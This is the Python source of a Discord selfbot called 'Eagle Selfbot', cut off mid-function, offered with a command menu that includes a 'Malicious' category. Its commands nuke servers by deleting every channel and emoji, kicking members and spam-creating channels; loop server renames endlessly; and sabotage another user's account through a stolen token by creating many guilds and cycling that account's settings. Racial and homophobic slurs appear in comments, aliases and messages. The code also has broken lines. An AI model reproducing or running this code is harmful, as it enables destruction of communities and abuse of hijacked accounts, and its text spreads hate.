# -----------------Eagle imports--------------------------
import asyncio
import datetime
import io
import json
import os
import random

import string
import time
from itertools import cycle
from bs4 import BeautifulSoup as bs4
import time
import aiohttp
import colorama
import discord
from discord.ext.commands import cog
from discord.ext.commands.converter import ColorConverter
import requests
from colorama import Fore
from discord.ext import commands
import discord
import base64
import os
import requests
from colorama import *
import colorama
from colorama import Fore as Color
import urllib
import math
from requests.api import post
from discord.utils import get
from contextlib import suppress

# ---------------------loading and opening--------------------------

# ---------------------Variable--------------------------


print("Prefix is .")
print("Press enter to continue...")
purple_dark = 0x6a006a
purple_medium = 0xa958a5
purple_light = 0xc481fb
orange = 0xffa500
gold = 0xdaa520
red_dark = 8e2430
red_light = 0xf94343
blue_dark = 0x3b5998
cyan = 0x5780cd
blue_light = 0xace9e7
aqua = 0x33a1ee
pink = 0xff9dbb
green_dark = 0x2ac074
green_dark = green_dark + 1
green_light = 0xa1ee33
white = 0xf9f9f6
cream = 0xffdab9
autofarmtitle = "Autofarm Commands"
autofarm = """``pls`` > Dank Memer Autofarm\n``Mee6`` > Mee6 Autofarm Lol"""
vape = "https://c.tenor.com/Yxw0OrsdqaEAAAAM/smoke-juul.gif"
created = "created by stoned.eagle#0001 and kojimu#1916"
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()
description = "`help1` - Shows the First help list, \n `help2` - Shows 2nd help"
title = "Eagle Selfbot"
del_sec = 60
desc = '{Eagle.user.name} Used your selfbot '
daddy = post
kojimu = daddy
loveofmylife = kojimu
status = """"""
sendfun = ".fun"
prefix = input()
nukedchannels = "eagles selfbot V1"
nukedchannels2 = "eagle runs u"
nukedchannels3 = "eagle runs u"
textuwu = ".help command to use"
nukedchannelname = "e"
nukedchannelname2 = "e"
nukedchannelname3 = "eagle runs u"
nukedchannelname4 = "eagle runs U"
#-------------------------------------------------------------




#--------------------def--------------------------------------------    @commands.command()


def Clear():
    os.system('cls')

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

#-------------------------------------------------------------------
Clear()	


def Init():
    token = input()
    try:
        Eagle.run(token, bot=False, reconnect=True)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Invalid token lol" + Fore.RESET)
        os.system('pause  >  NUL')



colorama.init()
Eagle = discord.Client()
Eagle = commands.Bot(description='Eagle ', command_prefix=".", self_bot=True)
Eagle.remove_command('help')


def design():
    print(f'''{Fore.CYAN}
───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───{Fore.CYAN}
───█▒▒░░░░░░░░░▒▒█───{Fore.CYAN}
────█░░█░░░░░█░░█────{Fore.CYAN}
─▄▄──█░░░▀█▀░░░█──▄▄─{Fore.CYAN}
█░░█─▀▄░░░░░░░▄▀─█░░█{Fore.CYAN}

█▀▀ █▀▀█ █▀▀▀ █░░ █▀▀ 　 █▀▀ █▀▀ █░░ █▀▀ █▀▀▄ █▀▀█ ▀▀█▀▀ {Fore.CYAN}
█▀▀ █▄▄█ █░▀█ █░░ █▀▀ 　 ▀▀█ █▀▀ █░░ █▀▀ █▀▀▄ █░░█ ░░█░░ {Fore.CYAN}
▀▀▀ ▀░░▀ ▀▀▀▀ ▀▀▀ ▀▀▀ 　 ▀▀▀ ▀▀▀ ▀▀▀ ▀░░ ▀▀▀░ ▀▀▀▀ ░░▀░░{Fore.CYAN}
             |___/                                         
{Fore.RESET}
  
    {Fore.LIGHTRED_EX}eagle bot {Fore.CYAN}

  
    ''')


def command():
    print(f'''
───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───{Fore.CYAN}
───█▒▒░░░░░░░░░▒▒█───{Fore.CYAN}
────█░░█░░░░░█░░█────{Fore.CYAN}
─▄▄──█░░░▀█▀░░░█──▄▄─{Fore.CYAN}
█░░█─▀▄░░░░░░░▄▀─█░░█{Fore.CYAN}

█▀▀ █▀▀█ █▀▀▀ █░░ █▀▀ 　 █▀▀ █▀▀ █░░ █▀▀ █▀▀▄ █▀▀█ ▀▀█▀▀ {Fore.CYAN}
█▀▀ █▄▄█ █░▀█ █░░ █▀▀ 　 ▀▀█ █▀▀ █░░ █▀▀ █▀▀▄ █░░█ ░░█░░ {Fore.CYAN}
▀▀▀ ▀░░▀ ▀▀▀▀ ▀▀▀ ▀▀▀ 　 ▀▀▀ ▀▀▀ ▀▀▀ ▀░░ ▀▀▀░ ▀▀▀▀ ░░▀░░{Fore.CYAN}
             |___/  
{Fore.RED}
by stoned.eagle#0001  friend me or not hot
80 commands Loaded
Amogus activated ඞඞඞඞඞඞ
{Fore.RESET}

''')





start = datetime.datetime.now()
Egirl = Eagle

@Eagle.command()
async def pi(ctx):
    pi =3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989
    await ctx.send(math.sin(pi))




@Eagle.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    Eagle
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@Eagle.command()
async def softnuke(message):  # wuv u :( if your on this line ur gay 
    guild = message.guild
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{ColorConverter.WHITE}{channel.name} {Color.GREEN}was deleted in {Color.WHITE}{guild.name}")
        except:
            print(f"{Color.WHITE}{channel.name} {Color.RED}was not deleted in {Color.WHITE}{guild.name}")
    for member in guild.members:
        try:
            await member.kick()
            print(
                f"{Color.WHITE}{member.name}#{member.discriminator} {Color.GREEN}was banned in {Color.WHITE}{guild.name}")
        except:
            print(
                f"{Color.WHITE}{member.name}#{member.discriminator} {Color.RED}was not banned in {Color.WHITE}{guild.name}")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    await guild.create_text_channel("nuked")
    while True:
        await guild.create_text_channel("nuked")
        time.sleep(5)
        break
    print(
        f"{Color.YELLOW}[{datetime.datetime.now()} UTC]{Color.WHITE}\n{guild.name}{Color.GREEN} was nuked successfully.{Color.WHITE}\n")


# egirls

@Egirl.command()#negro
async def n(ctx):
    guild = ctx.guild
    await ctx.send(".spamrename")

    for emoji in ctx.guild.emojis:
        await emoji.delete()
        print(f"{emoji.name} has been deleted in {ctx.guild.name}")
    for member in ctx.guild.members:      
        try:
            await member.edit(nick="stonedeaglerunsu")
        except discord.Forbidden:
            print(f"{member.name} has NOT been renamed to in {ctx.guild.name}")
        else:
            print(f"{member.name} has been renamed to in {ctx.guild.name}")
          
    print(f'{guild.name}')
    for channel in guild.channels:
        await channel.delete()
        await ctx.guild.create_text_channel(name=nukedchannels)
        await ctx.guild.create_text_channel(name=nukedchannels2)
        await ctx.guild.create_text_channel(name=nukedchannels)
        await ctx.guild.create_text_channel(name=nukedchannels2)
        await ctx.guild.create_text_channel(name=nukedchannels3)
        await ctx.guild.create_text_channel(name=nukedchannels3)
        await ctx.guild.create_text_channel(name="https://discord.gg/6ZK37tpD7n")
        await ctx.guild.create_text_channel(name="Made by stoned.eagle#0001")
        await ctx.guild.create_role(name="stonedeagle", color=RandomColor())

@Eagle.command()
async def spamrename(ctx):
            await ctx.guild.edit(name=nukedchannelname)
            await ctx.guild.edit(name=nukedchannelname2)
            await ctx.guild.edit(name=nukedchannelname3)
            await ctx.guild.edit(name=nukedchannelname4)
            while True:
                await ctx.guild.edit(name=nukedchannelname2)
                await ctx.guild.edit(name=nukedchannelname3)
                await ctx.guild.edit(name=nukedchannelname4)
                await ctx.guild.edit(name="stoned.eagle was here ")
                await ctx.guild.edit(name="stoned.eagle LO")


@Eagle.command()  # Damn Kid
async def spam(ctx, amount: int, *, message):
    Eagle
    for _i in range(amount):
        await ctx.send(message)


@Eagle.command(pass_context=True)
async def eml(self, ctx, no_of_lines: int = 4):
    """displays colorful lines in embeds

     Parameters
         >   no_of_lines - how many lines to display, defaults to 4
        """
    for _ in range(no_of_lines):
        await ctx.invoke(self.bot.get_command("rc"), 200, 5, False)


@Eagle.command()
async def cleardms(ctx):
    await ctx.message.delete()
    for channel in Eagle.private_channels:
        if isinstance(channel, discord.DMChannel):
            async for msg in channel.history(limit=9999):
                try:
                    if msg.author == Eagle.user:
                        await msg.delete()

                except:
                    pass

                # Commands


# Most request APIs are nekobot Apis because its sexy as fuck :weary:
# shhhhhhhhhhhhhhhhhhhhhhh if your on this line your gay

Fun = """``Tweet`` > Tweet as a user\n``Fry`` > Fry a users pfp
\n ``revpfp``> Googles A Users Pfp, This commands skidded as fuck so dont blame me lmfao
\n Ghostp
"""


skiddafuq = 'how the fuck you seein this shit' 


@Eagle.command()
async def fun(ctx, ):
    embed = discord.Embed(title=f"{title}",
                          description=f"{skiddafuq}",
                          color=0x7009E9,
                          timestamp=ctx.message.created_at)
    await ctx.send(embed=embed)



# -------------------------------------------help command key: findthiscuh   renamethis bruh ------- faggot --------------------------------------------------------------------------------------
@Eagle.command()
async def help(ctx, category=None):
    if category is None:
        embed = discord.Embed(color=0x7009E9, timestamp=ctx.message.created_at)
        embed.set_author(name="Eagle Selfbot :😩" + str(Eagle.command_prefix),
                         icon_url=Eagle.user.avatar_url)
        embed.set_thumbnail(url=vape)
        embed.set_image(url="")  # YOU
        embed.add_field(name="🔥 > `Fun`", value="Fun Commands", inline=False)
        embed.add_field(name="🔥 > `AutoFarm`", value="AutoFarm Commands", inline=False)
        embed.add_field(name="🔥 > `Utility`", value="Utility Commands", inline=False)
        embed.add_field(name="🔥 > `Status`", value="Status Commands", inline=False)
        embed.add_field(name="🔥 > `Image`", value="Image Commands", inline=False)
        embed.add_field(name="🔥 > `Malicious`", value="Malicious Commands", inline=False)
        embed.add_field(name="🔥 > `Crypto`", value="Crypto Commands", inline=False)
        embed.add_field(name="🔥 > `Emoticon `", value="Emoticon  commands", inline=False)       
        await ctx.send(embed=embed)
    elif str(category).lower() == "fun":
        embed = discord.Embed(color=0x7009E9, timestamp=ctx.message.created_at)
        embed.set_image(url="")
        embed.description = f"""- ``Tweet``  -   Tweet As a user\n- ``Fry``  -   Frys a users pfp\n - ``Revpfp``  -  Googles A Users Pfp, This commands skidded as fuck lol \n - ``Ghostping``  -   Ghost Pings Someone, Use if gay\n - ``phc``  -   Makes a pornhub comment lol\n - ``Dick``  -   dick size :weary:\n - ``Spam``   \n - ``blankspam``  - Spams a clear character 3 times for 4 seconds\n - ``blank``  -   Extremely Large block of blank character - \n - ``loser``  -  Run and find out \n - ``daddy``  -   literally me LMFAO\n - ``hexcode`` -  Gets hex code of color\n  - ``triggertyping``  -   Fake Type\n - ``invisiblenickname`` - Makes your nickname invisible\n - ``dox`` - total real dox\n - ``realnitro`` - Generate Real Nitro\n - ``ascii`` - ascii lmfao\n - ``bait`` - Fake nitro\n -  ``dadjoke`` - Dad joke\n - ``reverse`` - Reverse text\n - ``funni`` - Funni  someone with an audio\n - ``infinite`` - Infinite video\n - ``troll`` - extremely long troll video\n - ``suscheck`` - Sus\n - ``vapingkitty`` - gif of a vaping kitty, how wholesome\n - ``dogwifhat`` - Dogwifhat
"""
        await ctx.send(embed=embed)  # if your on this line your gay
    elif str(category).lower() == "autofarm":
        embed = discord.Embed(color=0x7009E9, timestamp=ctx.message.created_at)
        embed.set_image(url="")
        embed.description = f" - ``mee6`` - Auto Mee6 \n - ``pls`` - Auto Dank memer"
        await ctx.send(embed=embed)
    elif str(category).lower() == "status":
        embed = discord.Embed(color=0x7009E9, timestamp=ctx.message.created_at)
        embed.set_image(url="")
        embed.description = f" `Status Changing`\n - ``listening`` - Change what ur listening too\n - ``playing`` - Change what your playing\n - ``watching`` - Change what your watching\n - ``stop`` - Stops status"
        await ctx.send(embed=embed)
    elif str(category).lower() == "utility":
        embed = discord.Embed(color=0x7009E9, timestamp=ctx.message.created_at)
        embed.set_image(url="")
        embed.description = f" - ``Mc``  -   Shows member count\n - ``Ignore``  -   Reads Guilds\n - ``Bots``  -   Testing command idgaf bout - \n - ``massunblock``  -   Unblocks Everyone lmfao tf else is it gonna do\n - ``picture [query]``    Sends an image based on your query\n - ``iplocate``  -   locate ip, GG Fatass IP logger (Me) :c\n - ``Help``  -   Literally tells you to look in console\n - ``nitro``  -  Random Nitro Code\n - ``massunban``  -   Unbans everyone, did you get nuked? tf?\n - ``av``  -   Get Someones Avatar\n - ``changenickname``  -   Changes user nickname lel\n - ``lockdown`` -   Locks chat down\n - ``cleardms`` - clears your dms\n - ``encode`` - Encode to base64\n - ``decode`` - Decode something from base64 lol fuck else it gonna do\n - ``cs`` - copy a server\n - ``emojispoofer`` - spoofs emoji\n - ``tempban`` - Temporary ban for amount of seconds\n - ``pi`` - Shows pi number rounded idfk\n - ``serverinfo`` - get server info\n - ``give`` - Give role to someone \n - ``take`` - take a role from someone\n - ``emojis`` - list emojis in server (broken)\n - ``bans`` - Show a list of banned people"
        await ctx.send(embed=embed)
    elif str(category).lower() == "image":
        embed = discord.Embed(color=0x7009E9, timestamp=ctx.message.created_at)
        embed.set_image(
            url="")
        embed.description = f" `imaging`\n - ``Tweet`` - Tweet a Message lel \n - ``phcomment`` - phcomment LOL so funni haha \n - ``imaage`` - Search up an image\n - ``fry`` - Fry a user :weary:\n - ``revpfp`` - Search up a pfp skidded command lol\n - ``av`` - get a users discord avatar\n - ``gif`` - Gif search"
        await ctx.send(embed=embed)
    elif str(category).lower() == "malicious":
        embed = discord.Embed(color=0x7009E9, timestamp=ctx.message.created_at)
        embed.set_image(
            url="")
        embed.description = f" `Malicious commands`\n - ``n`` - Nukes a server \n - ``softnuke`` - casual nuke nothing big \n - ``spam`` - Spam messages \n - ``pingroles`` - Ping every role\n - ``removegc`` - removes all gc people LMFAO bruh\n - ``disable`` - Destroy a discord token\n - ``earrape`` - earrape troll video\n - ``spamrename`` - Spam rename server name"
        await ctx.send(embed=embed)
    elif str(category).lower() == "crypto":
        embed = discord.Embed(color=0x7009E9, timestamp=ctx.message.created_at)
        embed.set_image(
            url="")
        embed.description = f" `Crypto commands`\n - ``daily`` - Get Daily price of btc and eth \n - ``btc`` - BTC price lmfao retard \n - ``eth`` - Get ETH price\n - ``usdbtc`` - converts usd to btc\n - ``usdeth`` - convert usd to eth\n - ``bitcoin`` - bitcoin price alternative"
        await ctx.send(embed=embed)
    elif str(category).lower() == "emoticon":
        embed = discord.Embed(color=0x7009E9, timestamp=ctx.message.created_at)
        embed.set_image(
            url="")
        embed.description = f" `Emoticon Commands commands`\n - ``lenny`` - lenny face\n - ``magic`` - magic lenny\n - ``angrytableflip``\n - ``wtf`` - Wtf face\n - ``happylenny`` - happy lenny\n - ``gunlenny`` - gun lenny\n - ``crosseye`` - cross eyed lenny\n "
        await ctx.send(embed=embed)
    ##---------------------------------------------------------------eagle---------------------------------


# back to mass code lol
@Eagle.command()
async def infinite(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File('cogs/bin/home2.mp4'))

@Eagle.command()
async def dogwifhat(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File('cogs/bin/avatar.png'))


@Eagle.command()
async def funni(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File('cogs/bin/playthistwice.ogg'))


@Eagle.command()
async def vapingkitty(ctx):
    await ctx.message.delete()
    await ctx.send(file=discord.File('cogs/bin/thekitty.gif'))



@Eagle.command()
async def dox(ctx, user: discord.Member = None):
    emaillist = random.choice(["gmx.de", "yahoo.com", "protonmail.com", "gmail.com"])
    nr = random.choice(range(0, 9999))
    ip = random.choice(["127.0.0.1", "192.168.0.1", "192.168.0.101"])
    country = random.choice(['Niger', 'Niggeria', "3rd world country", "Africa", "Retard lives on different planet","Canada"])
    if user is None:
        await ctx.send("Mention a member retard")
    else:
        try:
            embed = discord.Embed(color=green_dark, title=f"Doxing in progress %0",
                                  description="Getting his email and address", )
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.set_footer(text=" made by stoned.eagle#0001")
            a = await ctx.send(embed=embed)
            await asyncio.sleep(2)
            embed = discord.Embed(color=green_dark, title=f"Doxing in progress %50",
                                  description="Getting ip and stuffs", )
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.set_footer(text=" made by stoned.eagle#0001")
            await a.edit(embed=embed)
            await asyncio.sleep(2)
            embed = discord.Embed(color=green_dark, title=f"Doxing in progress %100",
                                  description="Getting mom credit cards", )
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.set_footer(text=" made by stoned.eagle#0001")
            await a.edit(embed=embed)
            await asyncio.sleep(2)
            embed = discord.Embed(color=green_dark, title=f"Dox of {user.name}", )
            embed.set_thumbnail(url="https://i.imgur.com/ZkFcOw6.gif")
            embed.add_field(name=f'Email', value=f'{user.name}{nr}@{emaillist}', inline=False)
            embed.add_field(name=f'IP', value=f'{ip}', inline=False)
            embed.add_field(name=f'Country', value=f'{country}', inline=False)
            embed.set_footer(text=" made by stoned.eagle#0001")
            await a.edit(embed=embed)
            await asyncio.sleep(2)
        except discord.HTTPException:
            a = await ctx.send("Doxing in progress %0 - Getting his email and address")
            await asyncio.sleep(2)
            await a.edit(content="Doxing in progress %50 - Getting ip and stuffs")
            await asyncio.sleep(2)
            await a.edit(content="Doxing in progress %100 - Getting mom credit cards")
            await asyncio.sleep(2)
            await a.edit(
                content=f"Dox of {user.name}:\n\nEmail: {user.name}{nr}@{emaillist}\nIP: {ip}\nCountry: {country}")


@Eagle.command()
async def invisiblenickname(ctx):
    try:
        name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
        await ctx.author.edit(nick=name)
        await ctx.send(f"Now your nickname is invisible")
    except Exception as e:
        await ctx.send(f"Lol no perms nigga")


@dox.error
async def dox_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.CommandInvokeError):
        time.sleep(0.1)
        await ctx.send("Cannot use the command in dms")


@Eagle.command()
async def emojispoofer(ctx):
    await ctx.message.delete()
    embed = discord.Embed(description="", color=0x800000)

    embed.add_field(name="Nitrospoofer", value=f"\n Nitro Emoji Spoofer on lmfao poor retard", inline=False)
    embed.set_thumbnail(url="")
    embed.set_footer(text="")
    channel3 = Eagle.get_channel(ctx.channel.id)
    await channel3.send(embed=embed)
    print(Fore.YELLOW + 'Command Used | nitroemojispoofer')


@Eagle.command()
async def helpy(ctx):
    embed = discord.Embed(title=f"{autofarmtitle}",
                          description=f"{autofarm}",
                          color=0x7009E9,
                          timestamp=ctx.message.created_at)
    await ctx.send(embed=embed)


import requests  # dependency


@help.error
async def help_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.CommandInvokeError):
        time.sleep(0.1)
        await ctx.send(".help2")
        await ctx.message.delete()


@Eagle.command()
async def load(extension):
    Eagle.load_extension(f'cogs.{extension}')


@Eagle.command()
async def unload(extension):
    Eagle.unload_extension(f'cogs.{extension}')




for filename in os.listdir('./cogs'):
    if filename.endswith('py'):
        Eagle.load_extension(f'cogs.{filename[:-3]}')




@Eagle.command()
async def encode(ctx, *, message):
    message = f"{message}"
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    embed = discord.Embed(title=f"encoded base64 LOL", description=f"{base64_message}", color=0x7009E9,
                          timestamp=ctx.message.created_at)

    await ctx.send(embed=embed)


footer = "Made By Stoned.eagle#0001"


@Eagle.command()
async def decode(ctx, message):
    base64_message = f'{message}'
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    decodee = message_bytes.decode('ascii')
    embed = discord.Embed(title=f"Decode for {message}!", description=f"{decodee}", color=0x7009E9,
                          timestamp=ctx.message.created_at)

    embed.set_footer(text=f'{footer} ')
    await ctx.send(embed=embed)


@Eagle.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)


@Eagle.command()
async def daddy(ctx):
    Eagle
    await ctx.channel.send("<@856178725858312224  >  ")


@Eagle.command()
async def pwned(ctx):
    Eagle
    r = requests.get("https://www.troyhunt.com/authentication-and-the-have-i-been-pwned-api/")
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"wholesomepicomguwu.png"))
    except:
        await ctx.send(link)


@Eagle.command()
async def cat(ctx):
    Eagle
    r = requests.get("https://api.thecatapi.com/v1/images/search").json()
    link = str(r[0]["url"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(link) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"wholesomepicomguwu.png"))
    except:
        await ctx.send(link)



@Eagle.command(aliases=[
    "bbwhatuwishinformaybeushouldwishitmorewhenitrainsitpoursidontknowhowtowishanymoreordoimightgomiamightjustblowmybrainsidbekurtcobianicantfeelmyfaceicantferelmyfaceicantfeelmyfaceceeeeeeeeiwishyouwouldfindyochillcauselordknowsthisshitwouldgetrealcantsavememansaveurselfcauseidonotneednohelpkeeponwishinkeeponwishinkeeponiwhiiiiiiiiingggoooaheeeeeeaaaaaaaaooohbbwhtuwishingformaybeyoushouldwishitmorebetheworldoisyouridontknowhowtowishanymoreordoimightgomiaaaaamightjustblowmybeainidbekurtcobainicantfeelmyfaceeeicantfeelmyfaceifcantfeelmyfaceeeeee",
    "fuckniggers"])
async def coinflip(ctx):
    choices = ["Heads", "Tails"]
    rancoin = random.choice(choices)
    await ctx.send(rancoin)


@Eagle.command(aliases=["suscheck","sussy"])
async def sus(ctx,user: discord.User):
    sus = ["Kinda sus", "Sus", "Sus as fuck","Not sus", "Sussy uwu "]
    user = user.mention
    randomsus = random.choice(sus)
    embed = discord.Embed(title = ("Sus check"), description=f"{user} is {randomsus}")
    await ctx.send(embed=embed)


@Eagle.command(aliases=["chnick", "changenick"])
async def changenickname(ctx, member: discord.Member, nick):
    await member.edit(nick=nick)
    await ctx.send(f'Nickname was changed to {nick} for {member.mention} lmao ')


@Eagle.command()
async def pingroles(ctx, *, message=None):
    mention = '\n\n'.join(role.mention for role in ctx.message.guild.roles)
    await ctx.message.channel.send(mention)


@Eagle.command()
async def loser(ctx):
    await ctx.channel.send(ctx.author.mention)


@Eagle.command(pass_context=True)
async def bitcoin(ctx):
    url = 'https://api.coindesk.com/v1/bpi/currentprice/BTC.json'
    response = requests.get(url)
    value = response.json()['bpi']['USD']['rate']
    await ctx.send("`Bitcoin price is: `$" + value)


@Eagle.command()
async def sadcat(ctx):
    Eagle
    rape = requests.get("https://api.alexflipnote.dev/sadcat").json()
    depressedcuh = str(rape['file'])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(depressedcuh) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"Eagle_sadcat.png"))
    except:
        await ctx.send(depressedcuh)


class MsgEmbed(discord.Embed):
    def __init__(self, text, footer):
        super().__init__()
        self.description = text
        self.footer_cont = footer
        self.color = 0xff781f
        self.set_footer(text=f"Eagle selfbot - {footer}",
                        icon_url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHEoOaI3YUCBy3h7kZ_kr4PCj9FkHLLIoeKQ&usqp=CAU")


@Eagle.command()
async def removegc(ctx):
    Eagle
    if isinstance(ctx.message.channel, discord.GroupChannel):
        for recipient in ctx.message.channel.recipients:
            await ctx.message.channel.remove_recipients(recipient)


@Eagle.command()
async def renamechannels(ctx, *, name):
    if not ctx.guild:
        await MsgEmbed("Fuck is u gonna do in a dm LMFOA").send(ctx)
        return
    if not name:
        await MsgEmbed("Fuck is they gonna be called Retard").send(ctx)
        return
    for channel in ctx.guild.channels:
        await channel.edit(name=name)


@Eagle.command(aliases=["gcleave"])
async def leavegc(ctx):
    Eagle
    if isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.message.channel.leave()


@Eagle.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Eagle.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass


@Eagle.command(aliases=["img", "image"])
async def picture(ctx, *, args):
    webeendancinforsolongunderthestars = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
    ifeellikethegrasscancutthroughmyskinsadnessimdepressedholyfuckhelpme = requests.get(
        webeendancinforsolongunderthestars)
    soup = bs4(ifeellikethegrasscancutthroughmyskinsadnessimdepressedholyfuckhelpme.text, 'html.parser')
    image_tags = soup.findAll('img')
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        link = image_tags[2]['src']
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(link) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"Eagle_anal.png"))
        except:
            await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
    else:
        await ctx.send("Nothing found for **" + args + "**")





@Eagle.command(aliases=['uwu', 'penis'])
async def dick(ctx, *, user: discord.Member = None):
    Eagle
    if user is None:
        user = ctx.author
    racist = random.randint(1, 15)
    myface = ""
    for _i in range(0, racist):
        myface += "="
    await ctx.send(f"{user}'s Dick size\n8{myface}D")


locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]


@Eagle.command(aliases=['tokenfucker', 'tokennuker', 'nuketoken'])
async def disable(ctx, _token):
    Eagle
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "property of eagle",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break

@Eagle.command(aliases=['addrole', 'addroles', 'give'])
async def ar(ctx, member: discord.Member, role: discord.Role):
  await member.add_roles(role)


@Eagle.command(aliases=['take', 'takerole', 'takeroles'])
async def tr(ctx, member: discord.Member, role: discord.Role):
  await ctx.message.delete()
  await member.remove_roles(role)




@Eagle.command()
@commands.has_permissions(administrator=True)
async def tempban(ctx, user: discord.User, bantime: int):
    await ctx.guild.ban(user)
    await ctx.send(f"Banned {user.mention}.")
    await ctx.user.send(f"Hey {user.mention}, you were banned from the server for %s seconds." % bantime)
    await asyncio.sleep(bantime)
    await ctx.guild.unban(user)
    await ctx.send(f"Unbanned {user.mention}.")


# if you see this you are a pretty decent skid
@Eagle.command()
async def bots(ctx):
    Eagle
    nomemberslol = []
    for member in ctx.guild.members:
        if member.bot:
            nomemberslol.append(
                str(member.name).replace("`", "\`").replace("*", "\*").replace("_", "\_") + "#" + member.discriminator)
    imagine = f"**Bots ({len(nomemberslol)}):**\n{', '.join(nomemberslol)}"
    await ctx.send(imagine)


@Eagle.command(aliases=['iplocate', 'findip'])
async def iplookup(ctx, *, ipaddr: str = '1.3.3.7'):
    soimago = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = soimago.json()
    noitnevergetsold = discord.Embed()
    depression = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
